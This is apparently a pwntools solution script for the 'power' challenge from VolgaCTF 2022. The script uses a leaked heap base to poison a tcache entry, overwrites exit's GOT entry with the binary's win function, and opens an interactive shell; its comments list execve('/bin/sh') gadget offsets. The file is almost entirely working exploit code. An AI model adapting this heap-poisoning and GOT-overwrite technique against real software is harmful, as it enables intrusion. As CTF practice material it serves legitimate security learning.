import pwn
import sys
import re

conn = pwn.remote("power.q.2022.volgactf.ru", 1337)
#conn = pwn.process("power-patched")
#conn = pwn.gdb.debug("./power-patched", env={})

exe = pwn.ELF("power")
pwn.context.binary = exe

pwn.context.log_level = 'debug'

libc = pwn.ELF("libc.so.6")

# Read in the heap base

heap_base_str = conn.readline()

heap_base = int(heap_base_str.split(b"Heap base is")[1], 16)

conn.readuntil(b"Where:")

exit_addr = exe.got['exit']

# Can't do this, don't know libc address!
# 0xcbd1a execve("/bin/sh", r12, r13)
# constraints:
#   [r12] == NULL || r12 == NULL
#   [r13] == NULL || r13 == NULL

# 0xcbd1d execve("/bin/sh", r12, rdx)
# constraints:
#   [r12] == NULL || r12 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xcbd20 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
#one_gadget_addr = 0xcbd1a


# Goal is to overwrite the tcache entry with @exit_addr, then the next
# write will allow us to change this to win address
win_addr = exe.symbols['win']

# on one run, heap base is 0x405000 and tcache entry is at 0x4050a8
tcache_entry_diff = 0xa8

tcache_entry_addr = heap_base + tcache_entry_diff

conn.sendline(f"{hex(tcache_entry_addr)}")

conn.readuntil(b"What:")
conn.sendline(f"{hex(exit_addr)}")

conn.send(pwn.p64(win_addr))

conn.interactive()

